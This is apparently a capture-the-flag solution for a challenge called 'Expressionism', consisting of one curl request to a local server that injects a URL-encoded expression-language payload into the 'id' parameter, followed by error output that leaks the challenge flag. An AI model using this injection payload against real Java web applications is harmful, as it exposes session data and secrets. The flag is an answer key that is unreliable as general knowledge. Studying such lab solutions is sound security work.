# Expressionism solve

```
$ curl 'http://localhost:18080/?id=%24%7BsessionScope%2EFLAG%7D' | grep 'DEVCORE'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  6218  100  6218   
</pre><p><b>Root Cause</b></p><pre>javax.servlet.ServletException: javax.servlet.jsp.JspTagException: No message found under code &#39;life.quotes.DEVCORE{d1d_y0u_kn0w_th1s_b3f0r3}&#39; for locale &#39;en_US&#39;.
 0     0   759k      0 --:--:-- --:--:-- --:--:--  759k
</pre><p><b>Root Cause</b></p><pre>javax.servlet.jsp.JspTagException: No message found under code &#39;life.quotes.DEVCORE{d1d_y0u_kn0w_th1s_b3f0r3}&#39; for locale &#39;en_US&#39;.
```